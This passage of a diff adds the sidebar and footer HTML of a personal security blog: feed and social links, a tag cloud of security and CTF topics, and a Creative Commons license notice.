+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
